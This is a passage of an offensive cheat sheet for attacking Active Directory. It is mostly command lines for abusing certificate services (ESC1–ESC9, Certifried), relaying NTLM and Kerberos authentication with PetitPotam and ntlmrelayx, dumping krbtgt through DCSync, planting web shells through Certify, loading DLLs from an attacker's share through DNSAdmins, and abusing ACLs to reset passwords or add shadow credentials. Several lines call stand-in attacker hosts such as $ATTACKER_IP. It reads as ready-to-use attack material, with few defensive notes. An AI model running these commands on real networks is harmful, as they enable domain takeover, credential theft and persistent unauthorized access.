/password:\u0026#39;iUAL)l\u0026lt;i$;UzD7W\u0026#39; .\\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt ls \\\\PC1.purple.lab\\c$ # IP of PC1: 10.0.0.4 Active Directory Certificate Services # Find ADCS Server crackmapexec ldap domain.lab -u username -p password -M adcs ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=\u0026lt;user\u0026gt;,OU=Users,DC=domain,DC=local' -w '\u0026lt;password\u0026gt;' -b \u0026quot;CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local\u0026quot; dNSHostName Enumerate AD Enterprise CAs with certutil: certutil.exe -config - -ping ESC1 - Misconfigured Certificate Templates # Domain Users can enroll in the VulnTemplate template, which can be used for client authentication and has ENROLLEE_SUPPLIES_SUBJECT set. This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA). Allows additional identities to be bound to a certificate beyond the Subject.\nRequirements:\nTemplate that allows for AD authentication ENROLLEE_SUPPLIES_SUBJECT flag [PKINIT] Client Authentication, Smart Card Logon, Any Purpose, or No EKU (Extended/Enhanced Key Usage) Exploitation:\nUse Certify.exe to see if there are any vulnerable templates Certify.exe find /vulnerable Certify.exe find /vulnerable /currentuser # or PS\u0026gt; Get-ADObject -LDAPFilter \u0026#39;(\u0026amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))\u0026#39; -SearchBase \u0026#39;CN=Configuration,DC=lab,DC=local\u0026#39; # or certipy \u0026#39;domain.local\u0026#39;/\u0026#39;user\u0026#39;:\u0026#39;password\u0026#39;@\u0026#39;domaincontroller\u0026#39; find -bloodhound Use Certify, Certi or Certipy to request a Certificate and add an alternative name (user to impersonate) # request certificates for the machine account by executing Certify with the \u0026#34;/machine\u0026#34; argument from an elevated command prompt. Certify.exe request /ca:dc.domain.local\\domain-DC-CA /template:VulnTemplate /altname:domadmin certi.py req \u0026#39;contoso.local/Anakin@dc01.contoso.local\u0026#39; contoso-DC01-CA -k -n --alt-name han --template UserSAN certipy req \u0026#39;corp.local/john:Passw0rd!@ca.corp.local\u0026#39; -ca \u0026#39;corp-CA\u0026#39; -template \u0026#39;ESC1\u0026#39; -alt \u0026#39;administrator@corp.local\u0026#39; Use OpenSSL and convert the certificate, do not enter a password openssl pkcs12 -in cert.pem -keyex -CSP \u0026#34;Microsoft Enhanced Cryptographic Provider v1.0\u0026#34; -export -out cert.pfx Move the cert.pfx to the target machine filesystem and request a TGT for the altname user using Rubeus Rubeus.exe asktgt /user:domadmin /certificate:C:\\Temp\\cert.pfx WARNING: These certificates will still be usable even if the user or computer resets their password!\nNOTE: Look for EDITF_ATTRIBUTESUBJECTALTNAME2, CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, ManageCA flags, and NTLM Relay to AD CS HTTP Endpoints.\nESC2 - Misconfigured Certificate Templates # Requirements:\nAllows requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0) Exploitation:\nFind template PS \u0026gt; Get-ADObject -LDAPFilter \u0026#39;(\u0026amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))\u0026#39; -SearchBase \u0026#39;CN=Configuration,DC=megacorp,DC=local\u0026#39; Request a certificate specifying the /altname as a domain admin like in ESC1. ESC3 - Misconfigured Enrollment Agent Templates # ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users\nRequest a certificate based on the vulnerable certificate template ESC3. $ certipy req \u0026#39;corp.local/john:Passw0rd!@ca.corp.local\u0026#39; -ca \u0026#39;corp-CA\u0026#39; -template \u0026#39;ESC3\u0026#39; [*] Saved certificate and private key to \u0026#39;john.pfx\u0026#39; Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user $ certipy req \u0026#39;corp.local/john:Passw0rd!@ca.corp.local\u0026#39; -ca \u0026#39;corp-CA\u0026#39; -template \u0026#39;User\u0026#39; -on-behalf-of \u0026#39;corp\\administrator\u0026#39; -pfx \u0026#39;john.pfx\u0026#39; ESC4 - Access Control Vulnerabilities # Enabling the mspki-certificate-name-flag flag for a template that allows for domain authentication, allow attackers to \u0026ldquo;push a misconfiguration to a template leading to ESC1 vulnerability\nSearch for WriteProperty with value 00000000-0000-0000-0000-000000000000 using modifyCertTemplate python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -get-acl Add the ENROLLEE_SUPPLIES_SUBJECT (ESS) flag to perform ESC1 python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag # Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from the WebServer template. C:\\\u0026gt;StandIn.exe --adcs --filter WebServer --ess --add Perform ESC1 and then restore the value python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag Using Certipy\n# overwrite the configuration to make it vulnerable to ESC1 certipy template \u0026#39;corp.local/johnpc$@ca.corp.local\u0026#39; -hashes :fc525c9683e8fe067095ba2ddc971889 -template \u0026#39;ESC4\u0026#39; -save-old # request a certificate based on the ESC4 template, just like ESC1. certipy req \u0026#39;corp.local/john:Passw0rd!@ca.corp.local\u0026#39; -ca \u0026#39;corp-CA\u0026#39; -template \u0026#39;ESC4\u0026#39; -alt \u0026#39;administrator@corp.local\u0026#39; # restore the old configuration certipy template \u0026#39;corp.local/johnpc$@ca.corp.local\u0026#39; -hashes :fc525c9683e8fe067095ba2ddc971889 -template \u0026#39;ESC4\u0026#39; -configuration ESC4.json ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 # If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name.\nExploitation:\nUse Certify.exe to check for UserSpecifiedSAN flag state which refers to the EDITF_ATTRIBUTESUBJECTALTNAME2 flag. Certify.exe cas Request a certificate for a template and add an altname, even though the default User template doesn\u0026rsquo;t normally allow to specify alternative names .\\Certify.exe request /ca:dc.domain.local\\domain-DC-CA /template:User /altname:DomAdmin Mitigation:\nRemove the flag : certutil.exe -config \u0026quot;CA01.domain.local\\CA01\u0026quot; -setreg \u0026quot;policy\\EditFlags\u0026quot; -EDITF_ATTRIBUTESUBJECTALTNAME2 ESC7 - Vulnerable Certificate Authority Access Control # Exploitation:\nDetect CAs that allow low privileged users the ManageCA or Manage Certificates permissions Certify.exe find /vulnerable Change the CA settings to enable the SAN extension for all the templates under the vulnerable CA (ESC6) Certify.exe setconfig /enablesan /restart Request the certificate with the desired SAN. Certify.exe request /template:User /altname:super.adm Grant approval if required or disable the approval requirement # Grant Certify.exe issue /id:[REQUEST ID] # Disable Certify.exe setconfig /removeapproval /restart Alternative exploitation from ManageCA to RCE on ADCS server:\n# Get the current CDP list. Useful to find remote writable shares: Certify.exe writefile /ca:SERVER\\ca-name /readonly # Write an aspx shell to a local web directory: Certify.exe writefile /ca:SERVER\\ca-name /path:C:\\Windows\\SystemData\\CES\\CA-Name\\shell.aspx /input:C:\\Local\\Path\\shell.aspx # Write the default asp shell to a local web directory: Certify.exe writefile /ca:SERVER\\ca-name /path:c:\\inetpub\\wwwroot\\shell.asp # Write a php shell to a remote web directory: Certify.exe writefile /ca:SERVER\\ca-name /path:\\\\remote.server\\share\\shell.php /input:C:\\Local\\path\\shell.php ESC8 - AD CS Relay Attack # An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller’s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.\nRequire Impacket PR #1101\nVersion 1: NTLM Relay + Rubeus + PetitPotam\nimpacket\u0026gt; python3 ntlmrelayx.py -t http://\u0026lt;ca-server\u0026gt;/certsrv/certfnsh.asp -smb2support --adcs impacket\u0026gt; python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate # For a member server or workstation, the template would be \u0026#34;Computer\u0026#34;. # Other templates: workstation, DomainController, Machine, KerberosAuthentication # Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam # You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN git clone https://github.com/topotam/PetitPotam python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP python3 petitpotam.py -d \u0026#39;\u0026#39; -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; $ATTACKER_IP $TARGET_IP python3 dementor.py \u0026lt;listener\u0026gt; \u0026lt;target\u0026gt; -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -d \u0026lt;domain\u0026gt; python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local # Use the certificate with rubeus to request a TGT Rubeus.exe asktgt /user:\u0026lt;user\u0026gt; /certificate:\u0026lt;base64-certificate\u0026gt; /ptt Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt # Now you can use the TGT to perform a DCSync mimikatz\u0026gt; lsadump::dcsync /user:krbtgt Version 2: NTLM Relay + Mimikatz + Kekeo\nimpacket\u0026gt; python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController # Mimikatz mimikatz\u0026gt; misc::efs /server:dc.lab.local /connect:\u0026lt;IP\u0026gt; /noauth # Kekeo kekeo\u0026gt; base64 /input:on kekeo\u0026gt; tgt::ask /pfx:\u0026lt;BASE64-CERT-FROM-NTLMRELAY\u0026gt; /user:dc$ /domain:lab.local /ptt # Mimikatz mimikatz\u0026gt; lsadump::dcsync /user:krbtgt Version 3: Kerberos Relay\n# Setup the relay sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine # Run mitm6 sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v Version 4: ADCSPwn - Require WebClient service running on the domain controller. By default this service is not installed.\nhttps://github.com/bats3c/ADCSPwn adcspwn.exe --adcs \u0026lt;cs server\u0026gt; --port [local port] --remote [computer] adcspwn.exe --adcs cs.pwnlab.local adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001 adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\\Temp\\cert_b64.txt adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\\mranderson --password The0nly0ne! --dc dc.pwnlab.local # ADCSPwn arguments adcs - This is the address of the AD CS server which authentication will be relayed to. secure - Use HTTPS with the certificate service. port - The port ADCSPwn will listen on. remote - Remote machine to trigger authentication from. username - Username for non-domain context. password - Password for non-domain context. dc - Domain controller to query for Certificate Templates (LDAP). unc - Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) . output - Output path to store base64 generated crt. Version 5: Certipy ESC8\ncertipy relay -ca 172.16.19.100 ESC9 - No Security Extension # Requirements:\nStrongCertificateBindingEnforcement set to 1 (default) or 0 Certificate contains the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value Certificate specifies Any Client authentication EKU GenericWrite over any account A to compromise any account B Scenario\nJohn@corp.local has GenericWrite over Jane@corp.local, and we want to compromise Administrator@corp.local. Jane@corp.local is allowed to enroll in the certificate template ESC9 that specifies the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value.\nObtain the hash of Jane with Shadow Credentials (using our GenericWrite) certipy shadow auto -username John@corp.local -p Passw0rd -account Jane Change the userPrincipalName of Jane to be Administrator. :warning: leave the @corp.local part certipy account update -username John@corp.local -password Passw0rd -user Jane -upn Administrator Request the vulnerable certificate template ESC9 from Jane\u0026rsquo;s account. certipy req -username jane@corp.local -hashes ... -ca corp-DC-CA -template ESC9 # userPrincipalName in the certificate is Administrator # the issued certificate contains no \u0026#34;object SID\u0026#34; Restore userPrincipalName of Jane to Jane@corp.local. certipy account update -username John@corp.local -password Passw0rd -user Jane@corp.local Authenticate with the certificate and receive the NT hash of the Administrator@corp.local user. certipy auth -pfx administrator.pfx -domain corp.local # Add -domain \u0026lt;domain\u0026gt; to your command line since there is no domain specified in the certificate. Certifried CVE-2022-26923 # An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.\nFind ms-DS-MachineAccountQuota python bloodyAD.py -d lab.local -u username -p \u0026#39;Password123*\u0026#39; --host 10.10.10.10 getObjectAttributes \u0026#39;DC=lab,DC=local\u0026#39; ms-DS-MachineAccountQuota Add a new computer in the Active Directory, by default MachineAccountQuota = 10 python bloodyAD.py -d lab.local -u username -p \u0026#39;Password123*\u0026#39; --host 10.10.10.10 addComputer cve \u0026#39;CVEPassword1234*\u0026#39; certipy account create \u0026#39;lab.local/username:Password123*@dc.lab.local\u0026#39; -user \u0026#39;cve\u0026#39; -dns \u0026#39;dc.lab.local\u0026#39; [ALTERNATIVE] If you are SYSTEM and the MachineAccountQuota=0: Use a ticket for the current machine and reset its SPN Rubeus.exe tgtdeleg export KRB5CCNAME=/tmp/ws02.ccache python bloodyAD -d lab.local -u \u0026#39;ws02$\u0026#39; -k --host dc.lab.local setAttribute \u0026#39;CN=ws02,CN=Computers,DC=lab,DC=local\u0026#39; servicePrincipalName \u0026#39;[]\u0026#39; Set the dNSHostName attribute to match the Domain Controller hostname python bloodyAD.py -d lab.local -u username -p \u0026#39;Password123*\u0026#39; --host 10.10.10.10 setAttribute \u0026#39;CN=cve,CN=Computers,DC=lab,DC=local\u0026#39; dNSHostName \u0026#39;[\u0026#34;DC.lab.local\u0026#34;]\u0026#39; python bloodyAD.py -d lab.local -u username -p \u0026#39;Password123*\u0026#39; --host 10.10.10.10 getObjectAttributes \u0026#39;CN=cve,CN=Computers,DC=lab,DC=local\u0026#39; dNSHostName Request a ticket # certipy req \u0026#39;domain.local/cve$:CVEPassword1234*@ADCS_IP\u0026#39; -template Machine -dc-ip DC_IP -ca discovered-CA certipy req \u0026#39;lab.local/cve$:CVEPassword1234*@10.100.10.13\u0026#39; -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA Either use the pfx or set a RBCD on your machine account to takeover the domain certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10 openssl pkcs12 -in dc.pfx -out dc.pem -nodes python bloodyAD.py -d lab.local -c \u0026#34;:dc.pem\u0026#34; -u \u0026#39;cve$\u0026#39; --host 10.10.10.10 setRbcd \u0026#39;CVE$\u0026#39; \u0026#39;CRASHDC$\u0026#39; getST.py -spn LDAP/CRASHDC.lab.local -impersonate Administrator -dc-ip 10.10.10.10 \u0026#39;lab.local/cve$:CVEPassword1234*\u0026#39; secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt \u0026#39;lab.local/Administrator@dc.lab.local\u0026#39; -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10 Pass-The-Certificate # Pass the Certificate in order to get a TGT, this technique is used in \u0026ldquo;UnPAC the Hash\u0026rdquo; and \u0026ldquo;Shadow Credential\u0026rdquo;\nWindows # Information about a cert file certutil -v -dump admin.pfx # From a Base64 PFX Rubeus.exe asktgt /user:\u0026#34;TARGET_SAMNAME\u0026#34; /certificate:cert.pfx /password:\u0026#34;CERTIFICATE_PASSWORD\u0026#34; /domain:\u0026#34;FQDN_DOMAIN\u0026#34; /dc:\u0026#34;DOMAIN_CONTROLLER\u0026#34; /show # Grant DCSync rights to an user ./PassTheCert.exe --server dc.domain.local --cert-path C:\\cert.pfx --elevate --target \u0026#34;DC=domain,DC=local\u0026#34; --sid \u0026lt;user_SID\u0026gt; # To restore ./PassTheCert.exe --server dc.domain.local --cert-path C:\\cert.pfx --elevate --target \u0026#34;DC=domain,DC=local\u0026#34; --restore restoration_file.txt Linux # Base64-encoded PFX certificate (string) (password can be set) gettgtpkinit.py -pfx-base64 $(cat \u0026#34;PATH_TO_B64_PFX_CERT\u0026#34;) \u0026#34;FQDN_DOMAIN/TARGET_SAMNAME\u0026#34; \u0026#34;TGT_CCACHE_FILE\u0026#34; ​ # PEM certificate (file) + PEM private key (file) gettgtpkinit.py -cert-pem \u0026#34;PATH_TO_PEM_CERT\u0026#34; -key-pem \u0026#34;PATH_TO_PEM_KEY\u0026#34; \u0026#34;FQDN_DOMAIN/TARGET_SAMNAME\u0026#34; \u0026#34;TGT_CCACHE_FILE\u0026#34; # PFX certificate (file) + password (string, optionnal) gettgtpkinit.py -cert-pfx \u0026#34;PATH_TO_PFX_CERT\u0026#34; -pfx-pass \u0026#34;CERT_PASSWORD\u0026#34; \u0026#34;FQDN_DOMAIN/TARGET_SAMNAME\u0026#34; \u0026#34;TGT_CCACHE_FILE\u0026#34; # Using Certipy certipy auth -pfx \u0026#34;PATH_TO_PFX_CERT\u0026#34; -dc-ip \u0026#39;dc-ip\u0026#39; -username \u0026#39;user\u0026#39; -domain \u0026#39;domain\u0026#39; certipy cert -export -pfx \u0026#34;PATH_TO_PFX_CERT\u0026#34; -password \u0026#34;CERT_PASSWORD\u0026#34; -out \u0026#34;unprotected.pfx\u0026#34; UnPAC The Hash # Using the UnPAC The Hash method, you can retrieve the NT Hash for an User via its certificate.\nWindows # Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC. Rubeus.exe asktgt /getcredentials /user:\u0026#34;TARGET_SAMNAME\u0026#34; /certificate:\u0026#34;BASE64_CERTIFICATE\u0026#34; /password:\u0026#34;CERTIFICATE_PASSWORD\u0026#34; /domain:\u0026#34;FQDN_DOMAIN\u0026#34; /dc:\u0026#34;DOMAIN_CONTROLLER\u0026#34; /show Linux # Obtain a TGT by validating a PKINIT pre-authentication $ gettgtpkinit.py -cert-pfx \u0026#34;PATH_TO_CERTIFICATE\u0026#34; -pfx-pass \u0026#34;CERTIFICATE_PASSWORD\u0026#34; \u0026#34;FQDN_DOMAIN/TARGET_SAMNAME\u0026#34; \u0026#34;TGT_CCACHE_FILE\u0026#34; # Use the session key to recover the NT hash $ export KRB5CCNAME=\u0026#34;TGT_CCACHE_FILE\u0026#34; getnthash.py -key \u0026#39;AS-REP encryption key\u0026#39; \u0026#39;FQDN_DOMAIN\u0026#39;/\u0026#39;TARGET_SAMNAME\u0026#39; Shadow Credentials # Add Key Credentials to the attribute msDS-KeyCredentialLink of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user. When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.\n:warning: User objects can\u0026rsquo;t edit their own msDS-KeyCredentialLink attribute while computer objects can. Computer objects can edit their own msDS-KeyCredentialLink attribute but can only add a KeyCredential if none already exists\nRequirements:\nDomain Controller on (at least) Windows Server 2016 Domain must have Active Directory Certificate Services and Certificate Authority configured PKINIT Kerberos authentication An account with the delegated rights to write to the msDS-KeyCredentialLink attribute of the target object Exploitation:\nFrom Windows, use Whisker:\n# Lists all the entries of the msDS-KeyCredentialLink attribute of the target object. Whisker.exe list /target:computername$ # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device. Whisker.exe add /target:\u0026#34;TARGET_SAMNAME\u0026#34; /domain:\u0026#34;FQDN_DOMAIN\u0026#34; /dc:\u0026#34;DOMAIN_CONTROLLER\u0026#34; /path:\u0026#34;cert.pfx\u0026#34; /password:\u0026#34;pfx-password\u0026#34; Whisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\\path\\to\\file.pfx /password:P@ssword1] # Removes a key credential from the target object specified by a DeviceID GUID. Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b From Linux, use pyWhisker:\n# Lists all the entries of the msDS-KeyCredentialLink attribute of the target object. python3 pywhisker.py -d \u0026#34;domain.local\u0026#34; -u \u0026#34;user1\u0026#34; -p \u0026#34;complexpassword\u0026#34; --target \u0026#34;user2\u0026#34; --action \u0026#34;list\u0026#34; # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device. pywhisker.py -d \u0026#34;FQDN_DOMAIN\u0026#34; -u \u0026#34;user1\u0026#34; -p \u0026#34;CERTIFICATE_PASSWORD\u0026#34; --target \u0026#34;TARGET_SAMNAME\u0026#34; --action \u0026#34;list\u0026#34; python3 pywhisker.py -d \u0026#34;domain.local\u0026#34; -u \u0026#34;user1\u0026#34; -p \u0026#34;complexpassword\u0026#34; --target \u0026#34;user2\u0026#34; --action \u0026#34;add\u0026#34; --filename \u0026#34;test1\u0026#34; # Removes a key credential from the target object specified by a DeviceID GUID. python3 pywhisker.py -d \u0026#34;domain.local\u0026#34; -u \u0026#34;user1\u0026#34; -p \u0026#34;complexpassword\u0026#34; --target \u0026#34;user2\u0026#34; --action \u0026#34;remove\u0026#34; --device-id \u0026#34;a8ce856e-9b58-61f9-8fd3-b079689eb46e\u0026#34; Scenario:\nScenario 1: Shadow Credential relaying\nTrigger an NTLM authentication from DC01 (PetitPotam) Relay it to DC02 (ntlmrelayx) Edit DC01\u0026rsquo;s attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker) Alternatively : ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$' Scenario 2: Workstation Takeover with RBCD\n# Only for C2: Add Reverse Port Forward from 8081 to Team Server 81 # Set up ntlmrelayx to relay authentication from target workstation to DC proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2\\$ --http-port 81 # Execute printer bug to trigger authentication from target workstation proxychains python3 printerbug.py ez.lab/matt:Password1\\!@ws2.ez.lab ws1@8081/file # Get a TGT using the newly acquired certificate via PKINIT proxychains python3 gettgtpkinit.py ez.lab/ws2\\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR # Get a ST (service ticket) for the target account proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\\\ws2\\$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v # Utilize the ST for future activity export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab Dangerous Built-in Groups Usage # If you do not want modified ACLs to be overwritten every hour, you should change ACL template on the object CN=AdminSDHolder,CN=System or set \u0026quot;dminCount attribute to 0 for the required object.\nThe AdminCount attribute is set to 1 automatically when a user is assigned to any privileged group, but it is never automatically unset when the user is removed from these group(s).\nFind users with AdminCount=1.\ncrackmapexec ldap 10.10.10.10 -u username -p password --admin-count # or python ldapdomaindump.py -u example.com\\john -p pass123 -d \u0026#39;;\u0026#39; 10.10.10.10 jq -r \u0026#39;.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]\u0026#39; domain_users.json # or Get-ADUser -LDAPFilter \u0026#34;(objectcategory=person)(samaccountname=*)(admincount=1)\u0026#34; Get-ADGroup -LDAPFilter \u0026#34;(objectcategory=group) (admincount=1)\u0026#34; # or ([adsisearcher]\u0026#34;(AdminCount=1)\u0026#34;).findall() AdminSDHolder Abuse # The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all \u0026ldquo;protected groups\u0026rdquo; in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.\nIf you modify the permissions of AdminSDHolder, that permission template will be pushed out to all protected accounts automatically by SDProp (in an hour). E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group.\n# Add a user to the AdminSDHolder group: Add-DomainObjectAcl -TargetIdentity \u0026#39;CN=AdminSDHolder,CN=System,DC=domain,DC=local\u0026#39; -PrincipalIdentity username -Rights All -Verbose # Right to reset password for toto using the account titi Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword # Give all rights Add-ObjectAcl -TargetADSprefix \u0026#39;CN=AdminSDHolder,CN=System\u0026#39; -PrincipalSamAccountName toto -Verbose -Rights All Abusing DNS Admins Group # It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).\n:warning: Require privileges to restart the DNS service.\nEnumerate members of DNSAdmins group Get-NetGroupMember -GroupName \u0026#34;DNSAdmins\u0026#34; Get-ADGroupMember -Identity DNSAdmins Change dll loaded by the DNS service # with RSAT dnscmd \u0026lt;servername\u0026gt; /config /serverlevelplugindll \\\\attacker_IP\\dll\\mimilib.dll dnscmd 10.10.10.11 /config /serverlevelplugindll \\\\10.10.10.10\\exploit\\privesc.dll # with DNSServer module $dnsettings = Get-DnsServerSetting -ComputerName \u0026lt;servername\u0026gt; -Verbose -All $dnsettings.ServerLevelPluginDll = \u0026#34;\\attacker_IP\\dll\\mimilib.dll\u0026#34; Set-DnsServerSetting -InputObject $dnsettings -ComputerName \u0026lt;servername\u0026gt; -Verbose Check the previous command success Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ -Name ServerLevelPluginDll Restart DNS sc \\\\dc01 stop dns sc \\\\dc01 start dns Abusing Active Directory ACLs/ACEs # Check ACL for an User with ADACLScanner.\nADACLScan.ps1 -Base \u0026#34;DC=contoso;DC=com\u0026#34; -Filter \u0026#34;(\u0026amp;(AdminCount=1))\u0026#34; -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show GenericAll # GenericAll on User : We can reset user\u0026rsquo;s password without knowing the current password\nGenericAll on Group : Effectively, this allows us to add ourselves (the user hacker) to the Domain Admin group :\nOn Windows : net group \u0026quot;domain admins\u0026quot; hacker /add /domain On Linux: using the Samba software suite : net rpc group ADDMEM \u0026quot;GROUP NAME\u0026quot; UserToAdd -U 'hacker%MyPassword123' -W DOMAIN -I [DC IP] using bloodyAD: bloodyAD.py --host [DC IP] -d DOMAIN -u hacker -p MyPassword123 addObjectToGroup UserToAdd 'GROUP NAME' GenericAll/GenericWrite : We can set a SPN on a target account, request a Service Ticket (ST), then grab its hash and kerberoast it.\n# Check for interesting permissions on accounts: Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match \u0026#34;RDPUsers\u0026#34;} # Check if current user has already an SPN setted: PowerView2 \u0026gt; Get-DomainUser -Identity \u0026lt;UserName\u0026gt; | select serviceprincipalname # Force set the SPN on the account: Targeted Kerberoasting PowerView2 \u0026gt; Set-DomainObject \u0026lt;UserName\u0026gt; -Set @{serviceprincipalname=\u0026#39;ops/whatever1\u0026#39;} PowerView3 \u0026gt; Set-DomainObject -Identity \u0026lt;UserName\u0026gt; -Set @{serviceprincipalname=\u0026#39;any/thing\u0026#39;} # Grab the ticket PowerView2 \u0026gt; $User = Get-DomainUser username PowerView2 \u0026gt; $User | Get-DomainSPNTicket | fl PowerView2 \u0026gt; $User | Select serviceprincipalname # Remove the SPN PowerView2 \u0026gt; Set-DomainObject -Identity username -Clear serviceprincipalname GenericAll/GenericWrite : We can change a victim\u0026rsquo;s userAccountControl to not require Kerberos preauthentication, grab the user\u0026rsquo;s crackable AS-REP, and then change the setting back.\nOn Windows: # Modify the userAccountControl PowerView2 \u0026gt; Get-DomainUser username | ConvertFrom-UACValue PowerView2 \u0026gt; Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose # Grab the ticket PowerView2 \u0026gt; Get-DomainUser username | ConvertFrom-UACValue ASREPRoast \u0026gt; Get-ASREPHash -Domain domain.local -UserName username # Set back the userAccountControl PowerView2 \u0026gt; Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose PowerView2 \u0026gt; Get-DomainUser username | ConvertFrom-UACValue On Linux: # Modify the userAccountControl $ bloodyAD.py --host [DC IP] -d DOMAIN -u AttackerUser -p MyPassword setDontReqPreauthFlag target_user # Grab the ticket $ GetNPUsers.py DOMAIN/target_user -format \u0026lt;AS_REP_responses_format [hashcat | john]\u0026gt; -outputfile \u0026lt;output_AS_REP_responses_file\u0026gt; # Set back the userAccountControl $ bloodyAD.py --host [DC IP] -d DOMAIN -u AttackerUser -p MyPassword setDontReqPreauthFlag target_user false GenericWrite # Reset another user\u0026rsquo;s password\nOn Windows: # https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1 $user = \u0026#39;DOMAIN\\user1\u0026#39;; $pass= ConvertTo-SecureString \u0026#39;user1pwd\u0026#39; -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential $user, $pass; $newpass = ConvertTo-SecureString \u0026#39;newsecretpass\u0026#39; -AsPlainText -Force; Set-DomainUserPassword -Identity \u0026#39;DOMAIN\\user2\u0026#39; -AccountPassword $newpass -Credential $creds; On Linux: # Using rpcclient from the Samba software suite rpcclient -U \u0026#39;attacker_user%my_password\u0026#39; -W DOMAIN -c \u0026#34;setuserinfo2 target_user 23 target_newpwd\u0026#34; # Using bloodyAD with 